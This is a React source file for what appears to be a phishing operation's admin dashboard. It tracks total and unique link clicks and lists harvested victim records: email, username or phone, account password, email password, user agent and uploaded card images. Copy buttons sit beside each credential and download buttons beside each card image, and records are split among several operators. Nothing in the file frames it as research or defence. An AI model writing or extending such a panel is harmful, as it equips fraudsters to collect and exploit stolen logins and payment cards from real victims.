import DashboardCard from '@/Components/DashboardCard';
import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout';
import { Head, Link } from '@inertiajs/react';
import { BanknotesIcon, CircleStackIcon, EyeIcon, TableCellsIcon } from '@heroicons/react/24/solid';
import { useEffect, useState } from 'react';
import DataTable from '@/Components/Table';
import CopyToClipboard from 'react-copy-to-clipboard';
import {usePage} from '@inertiajs/react';
import { registerChannels } from '@/lib/utils';
import axios from 'axios';
import HeadlessModal from '@/Components/HeadlessModal';
import { Dialog } from '@headlessui/react';
import { saveAs } from 'file-saver';
import { ArrowDownTrayIcon } from '@heroicons/react/20/solid';


const Dashboard = ( props ) => {

    const { auth } = usePage().props
    const { userIds } = usePage().props

    const [eupIndex, setEupIndex] = useState(null);
    const [passwordIndex, setPasswordIndex] = useState(null);
    const [emailPasswordIndex, setEmailPasswordIndex] = useState(null);

    const [accounts, setAccounts] = useState(props.accounts);
    const [totalAccounts, setTotalAccounts] = useState(props.totalAccounts);
    const [todayTotalAccounts, setTodayTotalAccounts] = useState(props.todayTotalAccounts);
    const [totalClicks, setTotalClicks] = useState(props.totalClicks);
    const [uniqueClicks, setUniqueClicks] = useState(props.uniqueClicks);
    let [isModalOpen, setIsModalOpen] = useState(false)
    let [accountDetails, setAccountDetails] = useState(null)

    let headItemData = [
        'Id',
        'email/Username/Phone',
        'Account Password',
        'Email Password',
        'Owner',
        'Time',
        'Action',
    ];

    const [headItems, setHeadItems] = useState(headItemData);

    const handleCredentialCopy = (index, type) => {
        if(type == 'eup'){
            setEupIndex(index)
        }

        if(type == 'password'){
            setPasswordIndex(index)
        }

        if(type == 'password_of_email'){
            setEmailPasswordIndex(index)
        }

        if(type == 'user_agent'){
            setUserAgentIndex(index)
        }
    }

    const handleMouseLeave = (type) => {
        if(type == 'eup'){
            setEupIndex(null)
        }

        if(type == 'password'){
            setPasswordIndex(null)
        }

        if(type == 'password_of_email'){
            setEmailPasswordIndex(null)
        }

        if(type == 'user_agent'){
            setUserAgentIndex(null)
        }
    }


    useEffect(() => {

        // let channels = registerChannels(userIds, auth.user, 'account.created');
        //
        // channels.forEach(channel => {
        //     channel.listen("AccountCreatedEvent", (event) => {
        //         if(!auth.user.is_admin){
        //             setAccounts(event.dashboardData.accounts)
        //             setTotalAccounts(event.dashboardData.totalAccounts)
        //             setTodayTotalAccounts(event.dashboardData.todayTotalAccounts)
        //         }else{
        //             setAccounts([event.account, ...accounts].slice(0,-1))
        //             setTotalAccounts(totalAccounts + 1)
        //             setTodayTotalAccounts(todayTotalAccounts + 1)
        //         }
        //     });
        // });
        //
        //
        // return () => {
        //     channels.forEach(channel => channel.unsubscribe());
        // };

    }, []);

    useEffect(() => {

        // let channels = registerChannels(userIds, auth.user, 'account.updated');
        //
        // channels.forEach(channel => {
        //
        //     channel.listen("AccountUpdatedEvent", (event) => {
        //         const updatedAccount = accounts.map(account => {
        //             if (account.id === event.account.id) {
        //                 return { ...account, password_of_email: event.account.password_of_email };
        //             }
        //             return account;
        //         });
        //
        //         setAccounts(updatedAccount);
        //
        //     });
        // });
        //
        //
        // return () => {
        //     channels.forEach(channel => channel.unsubscribe());
        // };

    }, []);

    useEffect(() => {

        // let channels = registerChannels(userIds, auth.user, 'link_info.created');
        //
        // channels.forEach(channel => {
        //     channel.listen("LinkInfoCreatedEvent", (event) => {
        //         console.log();
        //         if(!auth.user.is_admin){
        //             setTotalClicks(event.dashboardData.totalClicks)
        //             setUniqueClicks(event.dashboardData.uniqueClicks)
        //         }else{
        //             setTotalClicks(event.dashboardData.admin.totalClicks)
        //             setUniqueClicks(event.dashboardData.admin.uniqueClicks)
        //         }
        //     });
        // });
        //
        // return () => {
        //     channels.forEach(channel => channel.unsubscribe());
        // };

    }, []);


    const viewAccount = (account) => {
        setAccountDetails(account)

        setIsModalOpen(true)
    }

    const downloadCard = async (card_image) => {
        let imageUrl = "../storage/" + card_image;
        let fileName = `${Math.floor(Math.random() * 100000000000000)}.jpg`;

        try {
            const response = await axios.get(imageUrl, {
                responseType: 'blob',
            });

            const blob = new Blob([response.data], { type: response.data.type });
            saveAs(blob, fileName);
        } catch (error) {
            console.error('Error downloading the image', error);
        }
    };

    return (
        <AuthenticatedLayout
            header='Dashboard'
        >
            <Head title="Dashboard" />

            <HeadlessModal isModalOpen={isModalOpen} setIsModalOpen={setIsModalOpen}>
                <Dialog.Panel className="w-full max-w-3xl transform overflow-hidden rounded-2xl bg-white text-left align-middle shadow-xl transition-all">
                  <div className="mt-4 p-4 flex justify-center items-center">
                    <div className="bg-white overflow-hidden shadow rounded-lg border">
                            <div className="border-t border-gray-200 px-4 py-5 sm:p-0">
                                <dl className="sm:divide-y sm:divide-gray-200">
                                    <div className="py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                                        <dt className="text-sm font-medium text-gray-500">
                                            Email/Username/Phone
                                        </dt>
                                        <dd className="mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2">
                                            {accountDetails?.eup}
                                        </dd>
                                    </div>
                                    <div className="py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                                        <dt className="text-sm font-medium text-gray-500">
                                            Account Password
                                        </dt>
                                        <dd className="mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2">
                                            {accountDetails?.password}
                                        </dd>
                                    </div>
                                    <div className="py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                                        <dt className="text-sm font-medium text-gray-500">
                                            User Agent
                                        </dt>
                                        <dd className="mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2">
                                            {accountDetails?.user_agent ?? 'N/A'}
                                        </dd>
                                    </div>
                                    <div className="py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                                        <dt className="text-sm font-medium text-gray-500">
                                            Email Password
                                        </dt>
                                        <dd className="mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2">
                                            {accountDetails?.password_of_email ?? <span className='text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-yellow-500 bg-yellow-100 text-neutral-600'>N/A</span>}


                                        </dd>
                                    </div>
                                    <div className="py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                                        <dt className="text-sm font-medium text-gray-500">
                                            Card Images
                                        </dt>
                                        <dd className="mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2">
                                            {
                                                accountDetails?.card_image1 ? <div className='flex justify-start items-start gap-2'>
                                                    <div className='relative group after:after:content-[""] after:absolute after:w-full after:h-full after:bg-black after:z-10 after:left-0 after:top-0 after:rounded-md after:bg-opacity-60 hover:after:bg-opacity-0 hover:after:invisible duration-150'>
                                                        {
                                                            accountDetails?.card_image1 ? <img className='w-20 rounded-md border' src={'../storage/' + accountDetails?.card_image1} alt="card-image-1" /> : ''
                                                        }

                                                        <button type='button' onClick={() => downloadCard(accountDetails?.card_image1)} className='absolute opacity-0 invisible group-hover:opacity-100 group-hover:visible duration-150 p-2 bg-primary rounded-full text-white left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2' title='Download'><ArrowDownTrayIcon className='w-5 h-5'/></button>

                                                    </div>
                                                    <div className='relative group after:after:content-[""] after:absolute after:w-full after:h-full after:bg-black after:z-10 after:left-0 after:top-0 after:rounded-md after:bg-opacity-60 hover:after:bg-opacity-0 hover:after:invisible duration-150'>
                                                        {
                                                            accountDetails?.card_image2 ? <img className='w-20 rounded-md border' src={'../storage/' + accountDetails?.card_image2} alt="card-image-2" /> : ''
                                                        }

                                                        <button type='button' onClick={() => downloadCard(accountDetails?.card_image2)} className='absolute opacity-0 invisible group-hover:opacity-100 group-hover:visible duration-150 p-2 bg-primary rounded-full text-white left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2' title='Download'><ArrowDownTrayIcon className='w-5 h-5'/></button>

                                                    </div>
                                                </div>

                                                :

                                                <span className='text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-yellow-500 bg-yellow-100 text-neutral-600'>N/A</span>
                                            }
                                        </dd>
                                    </div>
                                    <div className="py-3 sm:py-5 sm:grid sm:grid-cols-3 sm:gap-4 sm:px-6">
                                        <dt className="text-sm font-medium text-gray-500">
                                            Account Type
                                        </dt>
                                        <dd className="mt-1 text-sm text-gray-900 sm:mt-0 sm:col-span-2">
                                            <span className='text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-green-400 bg-green-100 text-green-800'>{accountDetails?.type?.name}</span>
                                        </dd>
                                    </div>
                                </dl>
                            </div>
                        </div>
                  </div>
                </Dialog.Panel>
            </HeadlessModal>

            <div className="overflow-hidden">
                <div className="grid grid-cols-1 gap-4 md:grid-cols-2 md:gap-6 xl:grid-cols-4 2xl:gap-7">
                    <DashboardCard title="Total clicks" value={totalClicks} className='bg-green-500'>
                        <EyeIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                    <DashboardCard title="Unique clicks" value={uniqueClicks} className='bg-blue-400'>
                        <CircleStackIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                    <DashboardCard title="Accounts" value={todayTotalAccounts} className='bg-orange-400'>
                        <BanknotesIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                    <DashboardCard title="Total Accounts" value={totalAccounts} className='bg-fuchsia-500'>
                        <TableCellsIcon className='w-3 h-3 text-white'/>
                    </DashboardCard>
                </div>
            </div>
            <div className='mt-20'>
                <DataTable headItems={headItems}>
                    {
                        accounts.map((account, i) => (
                            <tr key={i} className='odd:bg-white even:bg-slate-100'>
                                <td className="text-left py-3 px-4">{account.id}</td>
                                <CopyToClipboard text={account.eup}>
                                    <td className="text-left py-3 px-4 cursor-pointer">
                                        <button onMouseLeave={() => handleMouseLeave('eup')} onClick={() => handleCredentialCopy(i, 'eup')} type='button' className='font-semibold' title='Click to copy'>{account.eup}</button>
                                        {
                                            eupIndex == i ? <span className='text-[12px] text-primary ml-1'>Copied</span> : ''
                                        }
                                    </td>
                                </CopyToClipboard>
                                <CopyToClipboard text={account.password}>
                                    <td className="text-left py-3 px-4 cursor-pointer">
                                        <button onMouseLeave={() => handleMouseLeave('password')} onClick={() => handleCredentialCopy(i, 'password')} type='button' className='font-semibold' title='Click to copy'>{account.password}</button>
                                        {
                                            passwordIndex == i ? <span className='text-[12px] text-primary ml-1'>Copied</span> : ''
                                        }
                                    </td>
                                </CopyToClipboard>

                                {
                                    account.password_of_email ? <CopyToClipboard text={account.password_of_email}>
                                        <td className="text-left py-3 px-4 cursor-pointer">
                                            <button onMouseLeave={() => handleMouseLeave('password_of_email')} onClick={() => handleCredentialCopy(i, 'password_of_email')} type='button' className='font-semibold' title='Click to copy'>{account.password_of_email}</button>
                                            {
                                                emailPasswordIndex == i ? <span className='text-[12px] text-primary ml-1'>Copied</span> : ''
                                            }
                                        </td>
                                    </CopyToClipboard>
                                    :

                                    <td className="text-left py-3 px-4">
                                        <span className="bg-yellow-100 text-yellow-800 text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-yellow-400">N/A</span>
                                    </td>
                                }

                                {
                                    (account.owner && auth.user.is_admin) &&
                                        ( account.owner.name == auth.user.name) ?
                                            <td className="text-left py-3 px-4">
                                                <span className="bg-blue-100 text-black text-xs font-medium me-2 px-2.5 py-0.5 rounded border border-blue-400">You</span>
                                            </td>
                                            :
                                            <td className="text-left py-3 px-4">
                                                {account.owner?.name}
                                            </td>
                                }

                                <td className="text-left py-3 px-4 italic font-thin">{account.time_for_humans}</td>

                                <td className="text-left py-3 px-4">
                                    <button onClick={() => viewAccount(account)} className='rounded-md bg-purple-400 p-2 px-4 text-white'>View</button>
                                </td>
                            </tr>
                        ))
                    }
                </DataTable>
            </div>
        </AuthenticatedLayout>
    );
}

export default Dashboard;
